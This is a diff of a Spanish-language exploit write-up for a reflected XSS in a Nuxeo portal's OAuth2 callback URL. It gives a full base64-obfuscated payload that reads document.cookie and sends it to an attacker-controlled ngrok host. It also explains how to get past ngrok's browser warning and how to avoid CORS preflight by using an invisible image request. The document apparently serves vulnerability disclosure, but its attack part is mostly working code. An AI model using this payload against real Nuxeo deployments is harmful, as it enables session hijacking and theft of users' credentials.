@@ -178,11 +178,49 @@ python3 -m http.server 80
 
 Se ejecutó el siguiente payload XSS que realiza una petición hacia el servidor controlado por el atacante:
 ```
-https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly9hNTZmYWE1ZDcyYjIubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback
 ```
 _________________________________________________
 
-Hubo una situacion particular a la hora de hacer que funcionara el payload
+Hubo una situacion particular a la hora de hacer que funcionara el script codificado, debido a un problema al hacer **fetch** al servidor Ngrok
+
+Ya que cuando visito manualmente https://xxxxx.ngrok-free.app, aparece un _browser warning_ de ngrok que bloquea el acceso automático.
+Esto es lo que está bloqueando tu petición con fetch. Ngrok ahora intercepta tráfico HTTP(S) sospechoso y requiere cabeceras especiales.
+
+Como Ngrok lo documenta claramente. Se debe agregar esta cabecera:
+```
+ngrok-skip-browser-warning: true
+```
+Asi que el codigo funcional que se debe enviar seria:
+```
+fetch("https://xxxxx.ngrok-free.app/log", {
+  headers: {
+    "ngrok-skip-browser-warning": "true"
+  }
+})
+```
+Quedando finalmente y antes de codificar asi:
+```
+btoa(`fetch("https://xxxxx.ngrok-free.app/log", {headers: {"ngrok-skip-browser-warning": "true"}})`)
+```
+
+Aunque nuevamente generaba otro error, especificamente un error 505, ya que el navegador intenta hacer una preflight request CORS (método OPTIONS) antes de enviar el fetch.:
+
+<img width="1652" height="307" alt="image" src="https://github.com/user-attachments/assets/611eaf6c-1a96-4e3b-9690-cbcce3708048" />
+
+Usar una imagen, no fetch (más difícil de bloquear por CORS), asi que como alternativa se usa una imagen invisible (sin OPTIONS ni CORS):
+```
+i = new Image();
+i.src = "https://xxxxx.ngrok-free.app/log?c=" + document.cookie;
+```
+Codificado en base 64:
+```
+https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback
+
+```
+
+<img width="1593" height="891" alt="image" src="https://github.com/user-attachments/assets/10555ab4-b275-4950-8bee-c858d61494b6" />
+
 
 
 _________________________________________________
